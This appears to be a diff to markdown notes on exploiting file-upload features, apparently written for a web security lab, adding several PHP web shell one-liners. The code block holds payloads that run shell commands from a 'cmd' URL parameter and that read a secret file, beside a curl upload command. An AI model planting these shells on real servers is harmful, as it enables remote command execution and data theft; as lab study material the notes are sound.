@@ -6,8 +6,11 @@ curl -X POST "http://$target/file-upload" -F "file=@test.txt" -F "filename=test.
 A more versatile web shell may look something like this:
 
 ```bash
+<?php echo system('id'); ?>
 <?php echo system($_GET['cmd']); ?>
+<?php echo shell_exec($_GET["cmd"]);?>
 <?php echo file_get_contents('/home/carlos/secret'); ?>
+'<?php echo shell_exec($_GET["cmd"]); ?>'
 ```
 
 ```
